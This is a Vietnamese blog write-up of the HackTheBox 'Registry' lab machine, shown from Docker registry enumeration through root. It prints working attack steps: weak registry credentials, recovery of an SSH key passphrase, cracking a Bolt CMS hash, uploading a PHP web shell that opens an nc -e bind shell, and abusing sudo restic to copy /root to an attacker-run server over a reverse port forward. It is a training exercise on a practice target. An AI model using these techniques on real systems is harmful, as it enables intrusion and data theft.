</span></span><span class=line><span class=cl>2020/02/10 16:09:49 Starting <span class=nv>gobuster</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/v2 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 39<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Thấy có thư mục <code>/v2</code> báo mã <code>301</code> thì trang này có gắn basic auth. Thử nhập <code>admin:admin</code> vào thì được :v. Có lẽ auth mô phỏng lại lỗi đặt basic auth quá dễ đoán. Sau khi nhập được basic auth thì ở docker có thư mục <code>_catalog</code> để kiểm tra có image gì trong đấy.</p><p><img loading=lazy src=https://images.viblo.asia/02cf4944-af7d-41c1-9dce-edb0c4fa6983.png alt></p><h2 id=get-user>Get User<a hidden class=anchor aria-hidden=true href=#get-user>#</a></h2><p>Vậy là ta biết được image tên là gì rồi thì mình pull docker về xem sao.</p><p>Nhưng trong lúc mình pull docker về thì gặp lỗi này</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>minhtuan@kali:~$ sudo docker pull docker.registry.htb/bolt-image
</span></span><span class=line><span class=cl>Using default tag: latest
</span></span><span class=line><span class=cl>Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority
</span></span></code></pre></td></tr></table></div></div><p>Hóa ra là mình chưa có certificate. Vậy thì update certificate thủ công thôi Vào <a href=https://docker.registry.htb>https://docker.registry.htb</a> tải file .crt về copy file đấy vào</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>/usr/local/share/ca-certificates
</span></span><span class=line><span class=cl>sudo update-ca-certificates
</span></span><span class=line><span class=cl>sudo service docker restart
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>minhtuan@kali:~$ sudo docker login https://docker.registry.htb
</span></span><span class=line><span class=cl>Username: admin
</span></span><span class=line><span class=cl>Password: 
</span></span><span class=line><span class=cl>WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
</span></span><span class=line><span class=cl>Configure a credential helper to remove this warning. See
</span></span><span class=line><span class=cl>https://docs.docker.com/engine/reference/commandline/login/#credentials-store
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Login Succeeded
</span></span></code></pre></td></tr></table></div></div><p>Thành công, lúc này ta có thể pull docker về và sử dụng bình thường rồi.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  ~ docker pull docker.registry.htb/bolt-image
</span></span><span class=line><span class=cl>Using default tag: latest
</span></span><span class=line><span class=cl>latest: Pulling from bolt-image
</span></span><span class=line><span class=cl>Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b
</span></span><span class=line><span class=cl>Status: Image is up to date <span class=k>for</span> docker.registry.htb/bolt-image:latest
</span></span><span class=line><span class=cl>docker.registry.htb/bolt-image:latest
</span></span></code></pre></td></tr></table></div></div><p>Pull về xong rồi thì chui vào thôi</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  ~ docker run --rm -it docker.registry.htb/bolt-image:latest
</span></span><span class=line><span class=cl>root@9818304f783b:/# 
</span></span></code></pre></td></tr></table></div></div><p>Kinh nghiệm của mình là cứ tập trung vào những folder nào nó cực kỳ nhạy cảm như <code>ssh</code>, rồi mấy thư mục của <code>user</code>, <code>/var/www/html</code> xem có gì không. Lục mãi thì trong thư mục <code>/root/.ssh</code> có file private key ssh. Sử dụng <code>ssh2john.py</code> và <code>john</code> brute force lấy pass private key nhưng mà k được. Nên mình quay lại docker xem bên trong còn gì nữa không. Sau một hồi tìm kiếm lùng sục thì mình thấy có 1 file này ở đây.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>root@9818304f783b:/etc/profile.d# cat 01-ssh.sh 
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/expect -f</span>
</span></span><span class=line><span class=cl><span class=c1>#eval `ssh-agent -s`</span>
</span></span><span class=line><span class=cl>spawn ssh-add /root/.ssh/id_rsa
</span></span><span class=line><span class=cl>expect <span class=s2>&#34;Enter passphrase for /root/.ssh/id_rsa:&#34;</span>
</span></span><span class=line><span class=cl>send <span class=s2>&#34;GkOcz221Ftb3ugog\n&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>expect <span class=s2>&#34;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&#34;</span>
</span></span><span class=line><span class=cl>interact
</span></span></code></pre></td></tr></table></div></div><p>Vậy đây là đoạn chương trình tạo khóa private key. Mật khẩu file <code>id_rsa</code> kia là <code>GkOcz221Ftb3ugog</code>. Việc còn lại là mình ssh vào machine thôi.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  registry ssh -i id_rsa root@10.10.10.159      
</span></span><span class=line><span class=cl>Enter passphrase <span class=k>for</span> key <span class=s1>&#39;id_rsa&#39;</span>: 
</span></span><span class=line><span class=cl>root@10.10.10.159<span class=err>&#39;</span>s password: 
</span></span></code></pre></td></tr></table></div></div><p>K được. Cơ mà mình hơi ngây thơ, ssh vào root thì bài này đã dễ quá =)). Xong mình nhìn lại cái tên image docker là <code>bolt-image</code>. Thử sử dụng user ssh là <code>bolt</code> xem sao.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  registry ssh -i id_rsa bolt@10.10.10.159
</span></span><span class=line><span class=cl>Enter passphrase <span class=k>for</span> key <span class=s1>&#39;id_rsa&#39;</span>:
</span></span><span class=line><span class=cl>Welcome to Ubuntu 18.04.3 LTS <span class=o>(</span>GNU/Linux 4.15.0-65-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Mon Feb <span class=m>10</span> 09:35:17 UTC <span class=m>2020</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:  0.0               Users logged in:                <span class=m>1</span>
</span></span><span class=line><span class=cl>  Usage of /:   5.7% of 61.80GB   IP address <span class=k>for</span> eth0:            10.10.10.159
</span></span><span class=line><span class=cl>  Memory usage: 32%               IP address <span class=k>for</span> br-1bad9bd75d17: 172.18.0.1
</span></span><span class=line><span class=cl>  Swap usage:   0%                IP address <span class=k>for</span> docker0:         172.17.0.1
</span></span><span class=line><span class=cl>  Processes:    <span class=m>173</span>
</span></span><span class=line><span class=cl>Last login: Mon Feb <span class=m>10</span> 09:06:21 <span class=m>2020</span> from 10.10.16.7
</span></span><span class=line><span class=cl>bolt@bolt:~$ 
</span></span><span class=line><span class=cl>user.txt
</span></span></code></pre></td></tr></table></div></div><p>Và chúng ta có user</p><h2 id=get-root>Get Root<a hidden class=anchor aria-hidden=true href=#get-root>#</a></h2><p>Mình sử dụng private key để đăng nhập vào ssh của <strong>bolt</strong> nên mình chưa thể sử dụng sudo right để leo thang đặc quyền được vì khi gõ <code>sudo -l</code> hệ thống sẽ yêu cầu nhập mật khẩu của <strong>bolt</strong>. Mình đã sử dụng <code>LinEnum.sh</code> để khai thác ở user bolt này nhưng chưa thu được kết quả gì. Sau một hồi tìm tòi và thử, điều khiến cho mình tập trung tiếp là vào phần web. Mình tìm thấy được trong thư mục web có thư mục <code>/bolt</code>.</p><p><img loading=lazy src=https://images.viblo.asia/5f69fe28-9e40-4c19-87d1-f46fd06aae0f.png alt></p><p>Trang này được tạo bởi Bolt CMS, là 1 opensource. Thử <a href=http://registry.htb/bolt/bolt>http://registry.htb/bolt/bolt</a> thì vào được trang login. Công cuộc tiếp theo thì tìm kiếm account admin đăng nhập vào đây thôi. Lục tiếp trong folder <code>/var/www/html/bolt</code> thì có 1 file db.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>bolt@bolt:/var/www/html/bolt/app/database$ ls
</span></span><span class=line><span class=cl>bolt.db
</span></span><span class=line><span class=cl>bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db 
</span></span><span class=line><span class=cl>bolt.db: SQLite 3.x database, last written using SQLite version <span class=m>3022000</span>
</span></span></code></pre></td></tr></table></div></div><p>Check file thì đây là 1 file db SQLite 3. Tiếc là trên machine lại k có sqlite3 nên mình copy file này về máy để kiểm tra. Sử dụng scp để copy file bolt.db về máy mình</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  registry scp -i id_rsa bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db .
</span></span></code></pre></td></tr></table></div></div><p>Sau khi đã copy xong file thì mình chui vào xem trong đó có gì, mình tìm thấy tài khoản admin ở trong bảng <code>bolt_users</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  registry sqlite3 bolt.db
</span></span><span class=line><span class=cl>SQLite version 3.31.0 2019-12-29 00:52:41
</span></span><span class=line><span class=cl>Enter <span class=s2>&#34;.help&#34;</span> <span class=k>for</span> usage hints.
</span></span><span class=line><span class=cl>sqlite&gt; .table
</span></span><span class=line><span class=cl>bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
</span></span><span class=line><span class=cl>bolt_blocks       bolt_homepage     bolt_relations  
</span></span><span class=line><span class=cl>bolt_cron         bolt_log_change   bolt_showcases  
</span></span><span class=line><span class=cl>bolt_entries      bolt_log_system   bolt_taxonomy   
</span></span><span class=line><span class=cl>sqlite&gt; <span class=k>select</span> * from bolt_users 
</span></span><span class=line><span class=cl>   ...&gt; <span class=p>;</span>
</span></span><span class=line><span class=cl>1<span class=p>|</span>admin<span class=p>|</span><span class=nv>$2</span>y<span class=nv>$10$e</span>.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK<span class=p>|</span>bolt@registry.htb<span class=p>|</span>2020-02-09 23:27:11<span class=p>|</span>10.10.15.117<span class=p>|</span>Admin<span class=p>|</span><span class=o>[</span><span class=s2>&#34;themes://basic.php&#34;</span>,<span class=s2>&#34;themes://rev.php&#34;</span>,<span class=s2>&#34;themes://base-2018/meh.twig&#34;</span>,<span class=s2>&#34;themes://meh.twig&#34;</span>,<span class=s2>&#34;themes://shell.php&#34;</span><span class=o>]</span><span class=p>|</span>1<span class=o>||||</span>0<span class=o>||[</span><span class=s2>&#34;root&#34;</span>,<span class=s2>&#34;everyone&#34;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>sqlite&gt; 
</span></span></code></pre></td></tr></table></div></div><p>Sử dụng john để crack passwd admin ra được passwd là <code>strawberry</code>, đăng nhập vào <a href=http://registry.htb/bolt/bolt>http://registry.htb/bolt/bolt</a>. Ở đây có 1 trình upload file, ta thử upload file shell lên đây nhưng mà nó k cho upload file php lên.</p><p><img loading=lazy src=https://images.viblo.asia/caa1a8a0-d682-402f-aa24-1f84dd17e964.png alt></p><p>Sửa 1 chút config ở đây để server cho phép upload file php</p><p><img loading=lazy src=https://images.viblo.asia/db62738d-825e-4a7c-b4ff-cc26a96f558e.png alt></p><p><img loading=lazy src=https://images.viblo.asia/9f2d8446-18e2-4007-bce2-0eb3c7973c71.png alt></p><p>Sau đấy ta lưu lại rồi chuyển sang chức năng upload đẩy shell lên. Ban đầu mình sử dụng <a href=https://github.com/flozz/p0wny-shell>https://github.com/flozz/p0wny-shell</a> nhưng mà mình k thể reverse shell lại máy mình được. Mình đã chuyển hướng sang sử dụng bind shell để RCE. Sử dụng file shell.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;nc.traditional -lvp 4444 -e /bin/bash&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Upload lên rồi bên máy mình sử dụng lệnh</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  registry nc -nv 10.10.10.159 <span class=m>4444</span>
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.159<span class=o>]</span> <span class=m>4444</span> <span class=o>(</span>?<span class=o>)</span> open
</span></span></code></pre></td></tr></table></div></div><p>Upgrade lên pty shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>python -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Đến đây rồi lại tiếp tục sử dụng <strong>LinEnum.sh</strong> để kiểm tra xem có gì không thì mình thấy cái này</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> We can sudo without supplying a password!
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> www-data on bolt:
</span></span><span class=line><span class=cl>    env_reset, <span class=nv>exempt_group</span><span class=o>=</span>sudo, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User www-data may run the following commands on bolt:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/restic backup -r rest*
</span></span></code></pre></td></tr></table></div></div><p>Tập trung hết cơm gạo vào phần này để lấy root =)).</p><p>Giới thiệu sơ qua một chút, <strong>restic</strong> là 1 opensource sử dụng để backup, nói rõ hơn thì mình cũng chịu vì cái này quá mới so với mình =)), chả biết gì cả.</p><p>Ngồi đọc document của nó tại đây <a href=https://restic.readthedocs.io/en/latest/>https://restic.readthedocs.io/en/latest/</a> Sau một khoảng thời gian đọc doc với lên mạng tìm exam câu lệnh của nó thì mới biết là nó cần 1 server để backup. Người bạn chơi cùng mình bảo là nó có 1 restic server, nó tự động chạy trên cổng 8000. Mình ngồi tải file binary của nó ở đây <a href=https://github.com/restic/rest-server/releases>https://github.com/restic/rest-server/releases</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  Downloads ./rest-server-0.9.7-linux-amd64 
</span></span><span class=line><span class=cl>rest-server 0.9.7 compiled with go1.10 on linux/amd64
</span></span><span class=line><span class=cl>Data directory: /tmp/restic
</span></span><span class=line><span class=cl>Authentication disabled
</span></span><span class=line><span class=cl>Private repositories disabled
</span></span><span class=line><span class=cl>Starting server on :8000
</span></span></code></pre></td></tr></table></div></div><p>Chạy server xong thì tạo repo restic để lưu file backup</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  Downloads apt-get install restic 
</span></span><span class=line><span class=cl>➜  Downloads restic init -r /tmp/restic
</span></span><span class=line><span class=cl>enter password <span class=k>for</span> new repository: 
</span></span><span class=line><span class=cl>enter password again: 
</span></span><span class=line><span class=cl>created restic repository 03ab053496 at /tmp/restic
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Please note that knowledge of your password is required to access
</span></span><span class=line><span class=cl>the repository. Losing your password means that your data is
</span></span><span class=line><span class=cl>irrecoverably lost.
</span></span></code></pre></td></tr></table></div></div><p>Thực hiện remote port forwarding lên machine</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  registry ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159
</span></span></code></pre></td></tr></table></div></div><p>Sử dụng restic với quyền sudo backup thư mục <code>/root</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>www-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 /root
</span></span><span class=line><span class=cl>&lt;n/restic backup -r rest:http://127.0.0.1:8000 /root
</span></span><span class=line><span class=cl>enter password <span class=k>for</span> repository: <span class=m>123123</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password is correct
</span></span><span class=line><span class=cl>found <span class=m>2</span> old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
</span></span><span class=line><span class=cl>scan <span class=o>[</span>/root<span class=o>]</span>
</span></span><span class=line><span class=cl>scanned <span class=m>10</span> directories, <span class=m>14</span> files in 0:00
</span></span><span class=line><span class=cl><span class=o>[</span>0:01<span class=o>]</span> 100.00%  28.066 KiB / 28.066 KiB  <span class=m>24</span> / <span class=m>24</span> items  <span class=m>0</span> errors  ETA 0:00 
</span></span><span class=line><span class=cl>duration: 0:01
</span></span><span class=line><span class=cl>snapshot e5ef88b3 saved
</span></span><span class=line><span class=cl>www-data@bolt:~/html$ 
</span></span></code></pre></td></tr></table></div></div><p>Ngon, lưu snapshot được về máy mình rồi, điều quan trọng giờ là tìm lệnh để đọc nó ra thôi. Ngồi cat mấy cái folder trong <code>/tmp/restic</code> mà nó mã hóa hết luôn. Ngồi đọc doc thấy đoạn này, hóa ra là nó dùng restore chứ nó k phải kiểu mở ra rồi đọc được.</p><p><img loading=lazy src=https://images.viblo.asia/0acb1101-eaf6-4f50-98c5-43d6c84a21dc.png alt></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  restic restic -r /tmp/restic restore e5ef88b3 --target /tmp/restic-root 
</span></span><span class=line><span class=cl>enter password <span class=k>for</span> repository: 
</span></span><span class=line><span class=cl>repository 03ab0534 opened successfully, password is correct
</span></span><span class=line><span class=cl>restoring &lt;Snapshot e5ef88b3 of <span class=o>[</span>/root<span class=o>]</span> at 2020-02-10 06:26:17.454661805 +0000 UTC by root@bolt&gt; to /tmp/restic-root
</span></span></code></pre></td></tr></table></div></div><p>Xong rồi, vào <code>/tmp/restic-root</code> lấy cờ cuối thôi ;))</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  restic <span class=nb>cd</span> /tmp/restic-root 
</span></span><span class=line><span class=cl>➜  restic-root <span class=p>;</span>s
</span></span><span class=line><span class=cl>zsh: <span class=nb>command</span> not found: s
</span></span><span class=line><span class=cl>➜  restic-root ls
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>➜  restic-root <span class=nb>cd</span> root            
</span></span><span class=line><span class=cl>➜  root ls
</span></span><span class=line><span class=cl>config.yml  cron.sh  root.txt
</span></span></code></pre></td></tr></table></div></div><h2 id=thanks>Thanks<a hidden class=anchor aria-hidden=true href=#thanks>#</a></h2><p>Cảm ơn 2 thành viên trong team mình đã giúp đỡ mình trong lúc chơi ;)</p><ul><li>Nguyen Van Khanh B</li><li>Nguyen Xuan Hoa</li></ul><p>Hy vọng bài writeup của mình sẽ có thể giúp đỡ các bạn điều gì đó. Cảm ơn các bạn đã đọc đến đây. Mình sẽ ra những bài Writeup Hackthebox khi machine được đóng. Cùng theo dõi mình nhé.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/hackthebox/>HackTheBox</a></li><li><a href=https://minhtuanact.github.io/tags/registry/>Registry</a></li><li><a href=https://minhtuanact.github.io/tags/may-fest/>May Fest</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.github.io/posts/ssh-tunneling-local-port-forwarding-va-remote-port-forwarding/><span class=title>« Prev</span><br><span>SSH Tunneling - Local Port Forwarding và Remote Port Forwarding</span></a>
<a class=next href=https://minhtuanact.github.io/posts/ssh-tunneling-local-port-forwarding-va-remote-port-forwarding-update-dynamic-port-forwarding/><span class=title>Next »</span><br><span>SSH Tunneling - Local Port Forwarding và Remote Port Forwarding (update Dynamic Port Forwarding)</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox Writeup] Registry on twitter" href="https://twitter.com/intent/tweet/?text=%5bHackthebox%20Writeup%5d%20Registry&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-registry%2f&hashtags=HackTheBox%2cRegistry%2cMayFest"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox Writeup] Registry on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-registry%2f&title=%5bHackthebox%20Writeup%5d%20Registry&summary=%5bHackthebox%20Writeup%5d%20Registry&source=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-registry%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox Writeup] Registry on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-registry%2f&title=%5bHackthebox%20Writeup%5d%20Registry"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 